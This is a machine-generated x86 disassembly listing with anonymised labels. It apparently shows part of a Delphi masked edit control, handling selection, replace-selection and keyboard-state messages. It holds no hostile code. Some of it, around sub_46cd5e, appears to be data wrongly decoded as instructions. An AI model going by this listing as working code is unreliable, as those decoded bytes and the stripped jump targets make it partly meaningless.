test [ ebp - 0x9 ] 0x1
je r-xdata
push ebx
mov ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax edi
call sub_4044c4
sub esi [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax edi
call sub_404264
mov ecx eax
mov edx esi
mov eax edi
call sub_4044c4
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_4044c4
mov edx [ ebp - 0x28 ]
mov eax ebx
pop ecx
call sub_4042b0
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_404264
mov ecx eax
mov edx esi
sub edx [ ebp + 0x10 ]
mov eax edi
call sub_4044c4
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_4044c4
mov edx [ ebp - 0x20 ]
mov eax ebx
pop ecx
call sub_4042b0
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_404264
mov ecx eax
mov edx [ ebp - 0x10 ]
inc edx
mov eax edi
call sub_4044c4
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_40426c
jmp r-xdata
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c960
lea eax [ ebp - 0x28 ]
mov edx 0x6
call sub_403fc8
retn
lea eax [ ebp - 0x14 ]
mov dl [ ebp + 0xc ]
call sub_40418c
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_40426c
dec esi
jne r-xdata
sub_46c96c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46cb32
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx edi
call sub_403ff8
mov eax esi
call sub_404264
test eax eax
jle r-xdata
mov eax esi
call sub_404264
mov edx eax
mov eax esi
call sub_46c6fc
mov edi eax
mov eax [ ebx ]
call sub_404264
cmp edi eax
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov eax [ ebx ]
call sub_404264
test eax eax
jle r-xdata
mov eax [ ebx ]
call sub_404264
inc eax
push eax
sub edi [ ebp - 0x8 ]
push edi
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ ebx ]
mov eax esi
call sub_46c7d4
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_403ff8
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_46c6fc
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
call sub_404264
inc eax
mov [ ebp - 0xc ] eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebx ]
call sub_404264
sub eax edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cb39
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_403fc8
retn
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_46c174
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx ]
call sub_404264
cmp eax [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
dec edx
mov eax esi
call sub_46c7ac
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov edx [ ebx ]
mov eax esi
call sub_46c7d4
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_403ff8
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_46c344
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_40418c
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_40426c
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
mov eax ebx
call j_sub_404470#2
mov edx [ ebp - 0x10 ]
mov cl [ ebp - 0x1 ]
mov [ eax + edx - 0x1 ] cl
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_46c344
mov edx [ ebx ]
cmp al [ edx + edi - 0x1 ]
jne r-xdata
sub_46cb44
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46cb69
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cb70
retn
sub_46cd5e
inc esi
add [ edx + edx * 8 + 0x46 ] bh
add [ eax - 0x7ffb92e ] dh
fiadd [ esi ]
push eax
loopne r-xdata
popad
jae r-xdata
add [ eax + 0x180046df ] cl
loopne r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44f5cc
add [ eax ] al
mov eax eax
push esi
test dl dl
je r-xdata
add [ eax ] dl
into
inc esi
add al dh
into
inc esi
add [ eax - 0x31 ] al
inc esi
add [ edi ] cl
push esp
inc ebx
jne r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4404c8
mov al [ r-xdata ]
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
add eax 0x0
je r-xdata
test [ esp ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
add esp 0xc
call sub_4035d0
pop [ fs : 0x0 ]
insd
dec ebp
popad
jae r-xdata
cmp [ esi ] 0x25
je r-xdata
pop [ 0x0 ]
inc ebp
imul esi [ fs : eax + ebx * 4 - 0x33 ] 0xf070046
push esp
inc ebx
jne r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_46da74
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
push esi
je r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov eax ebx
call sub_46d398
test al al
je r-xdata
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
add [ ebx + 0x56 ] dl
insd
dec ebp
popad
jae sub_46ce10
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
inc ebp
imul esi [ fs : esp - 0x34 ] 0xc65c0046
inc ebx
add [ eax + eax ] cl
add al 0x4d
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_46dd0c
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_46d828
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_46dddc
sub_46cdbc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4404c8
mov al [ r-xdata ]
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_46ce10
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_46d398
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44f5cc
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_46da74
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_46dd0c
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_46d828
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_46dddc
sub_46cef0
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_46d398
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44f6b4
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esi ] 0x25
je r-xdata
test [ esp ] 0x4
je r-xdata
cmp [ esi ] 0x27
jne r-xdata
mov eax ebx
call sub_46d828
sub_46cf40
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44f784
mov eax esi
call sub_46d398
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov al [ ebx ]
sub al 0x3
je r-xdata
sub al 0x13
je r-xdata
sub al 0x2
je r-xdata
mov edx ebx
mov eax esi
call sub_46d89c
mov [ ebx ] 0x0
sub_46cf98
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b950
mov eax ebx
call sub_46d398
test al al
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_46d570
mov eax [ esp ]
mov [ ebx + 0x230 ] eax
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_46d828
movsx eax [ esi + 0x8 ]
cmp eax [ ebx + 0x234 ]
jle r-xdata
mov eax [ esp + 0x4 ]
mov [ ebx + 0x230 ] eax
sub_46d018
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d074
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46d080
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4043b0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d07b
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax esi
call sub_404464
mov edx eax
mov eax ebx
call sub_449f94
mov eax ebx
call sub_46d828
sub_46d094
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46d0d4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46d0e4
mov eax [ ebp - 0x4 ]
call sub_404264
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d0db
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_46d0e4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d168
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d398
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46d080
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_46e1a8
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_449fb8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d16f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
lea eax [ ebp - 0x8 ]
push eax
mov edx [ esi ]
xor ecx ecx
mov eax ebx
call sub_46e160
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403ff8
sub_46d178
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d26e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d398
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40403c
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_449fe8
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46e160
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_40403c
lea eax [ ebp - 0xc ]
push eax
mov cl [ ebx + 0x224 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_46c96c
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_40403c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d275
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46d018
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x22d ] 0x4
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
sub_46d27c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46d398
test al al
jne r-xdata
mov eax ebx
call sub_44085c
mov dx 0x2e
mov eax ebx
call sub_46dddc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_46d2b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d38a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d398
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
cmp [ ebx + 0x20e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d391
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
call sub_436ed4
mov edx [ eax ]
call [ edx + 0x18 ]
call sub_436ed4
lea edx [ ebp - 0x4 ]
call sub_436b1c
call sub_436ed4
mov edx [ eax ]
call [ edx + 0x14 ]
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_46d570
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46d080
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_46e894
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46d018
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_46e92c
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46d018
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_46d5b8
sub_46d3a8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d45d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46d080
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_46e1a8
lea eax [ ebx + 0x220 ]
mov edx esi
call sub_403ff8
mov eax esi
call sub_404264
mov edx eax
mov eax [ ebx + 0x220 ]
call sub_46c6fc
mov [ ebx + 0x228 ] eax
mov eax esi
call sub_46c580
mov [ ebx + 0x22c ] al
mov eax esi
call sub_46c604
mov [ ebx + 0x224 ] al
lea eax [ ebp - 0xc ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46e160
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_40403c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46d018
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d464
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc8
retn
sub_46d46c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x220 ]
call sub_4043b0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_450adc
test al al
je r-xdata
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_46d3a8
and [ ebx + 0x22d ] 0xfe
cmp [ ebx + 0x220 ] 0x0
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_46d570
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax ebx
call sub_4405f0
mov eax ebx
call sub_46d398
test al al
je r-xdata
or [ ebx + 0x22d ] 0x1
xor edx edx
mov eax ebx
call sub_46d018
mov eax ebx
call sub_450adc
test al al
je r-xdata
cmp [ ebx + 0x228 ] 0x0
jle r-xdata
mov eax ebx
call sub_4507d8
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_4405f0
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_46d5b8
sub_46d540
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46d398
test al al
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_4405f0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4405f0
pop esi
pop ebx
retn
sub_46d570
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb0
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_46d594
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb1
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_46d5b8
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] ecx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] ecx
mov [ ebp - 0x20c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46d818
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_46d398
test al al
je r-xdata
lea edx [ ebp - 0x20c ]
mov eax [ ebp - 0x4 ]
call sub_46d080
mov eax [ ebp - 0x20c ]
mov edx ebx
call sub_40c624
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
dec ebx
lea edx [ ebp - 0x218 ]
mov eax [ ebp - 0x4 ]
call sub_46d080
mov eax [ ebp - 0x218 ]
call sub_404264
cmp eax [ ebp - 0x8 ]
jg r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
lea edx [ ebp - 0x210 ]
mov eax [ ebp - 0x4 ]
call sub_46d080
mov eax [ ebp - 0x210 ]
call sub_404264
cmp ebx eax
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46d594
lea edx [ ebp - 0x21c ]
mov eax [ ebp - 0x4 ]
call sub_46d080
mov eax [ ebp - 0x21c ]
call sub_404264
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x214 ]
mov eax [ ebp - 0x4 ]
call sub_46d080
mov eax [ ebp - 0x214 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46d594
cmp ebx [ ebp - 0x8 ]
je r-xdata
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x230 ] edx
jmp r-xdata
lea eax [ ebp - 0x108 ]
push eax
call GetKeyboardState
mov edx 0x100
lea eax [ ebp - 0x208 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d81f
lea eax [ ebp - 0x21c ]
mov edx 0x5
call sub_403fc8
retn
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1f8 ] 0x81
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403450
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
mov [ ebp + eax - 0x208 ] 0x81
lea eax [ ebp - 0x208 ]
push eax
call SetKeyboardState
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x1
xor eax eax
push ebp
push sub_46d786
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403450
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x100
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SendMessageA
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403450
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x101
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x0
retn
sub_46d828
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_450adc
test al al
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_46d398
test al al
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_46d570
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_46d5b8
sub_46d874
push ebx
mov ebx eax
mov eax ebx
call sub_440634
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x238 ]
mov eax ebx
call sub_46d018
xor edx edx
mov eax ebx
call sub_44066c
sub_46d89c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46da61
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor eax eax
mov al [ ebx ]
cmp ax 0x1b
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da68
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp ax 0x8
je r-xdata
cmp ax 0xd
jne r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_46d570
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xf8 ]
jmp r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov dx 0x2e
mov eax esi
call sub_46dddc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46dcb0
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46d5b8
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_46e37c
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push 0x1
push 0x102
push 0x102
mov eax esi
call sub_4507d8
push eax
lea eax [ ebp - 0x2c ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebp - 0x28 ] 0x12
jne r-xdata
lea eax [ ebp - 0x10 ]
mov dl [ ebx ]
call sub_40418c
lea eax [ ebp - 0x30 ]
mov dl [ ebx ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_402b4c
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x24 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov cl 0x2
call sub_402b1c
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
call sub_404208
mov ecx [ ebp - 0x8 ]
add ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46d594
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
call PostQuitMessage
mov eax [ ebp - 0x10 ]
call sub_404464
push eax
push 0x0
push 0xc2
mov eax esi
call sub_4507d8
push eax
call SendMessageA
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_46d570
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46dc5c
sub_46da74
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46dc4e
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp - 0x1 ] 0x4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dc55
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fc8
retn
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46d570
test [ ebp - 0x1 ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
cmp si 0x27
jne r-xdata
cmp si 0x25
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax 0x2
jne r-xdata
dec [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
add eax 0x2
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
inc eax
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46dc94
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x230 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_46d080
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebx + 0x230 ] 0x0
jge r-xdata
mov eax [ ebx + 0x230 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
